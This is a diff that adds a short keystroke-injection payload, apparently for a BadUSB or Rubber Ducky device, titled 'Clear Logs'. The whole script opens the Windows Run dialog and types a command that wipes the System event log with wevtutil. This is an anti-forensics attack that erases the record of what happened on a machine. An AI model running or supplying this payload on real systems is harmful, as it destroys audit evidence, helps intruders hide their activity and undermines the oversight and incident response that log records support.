@@ -1,0 +1,10 @@
+REM Clear Logs
+
+GUI r
+
+DELAY 500
+
+STRING cmd /c wevtutil cl System
+
+ENTER
+
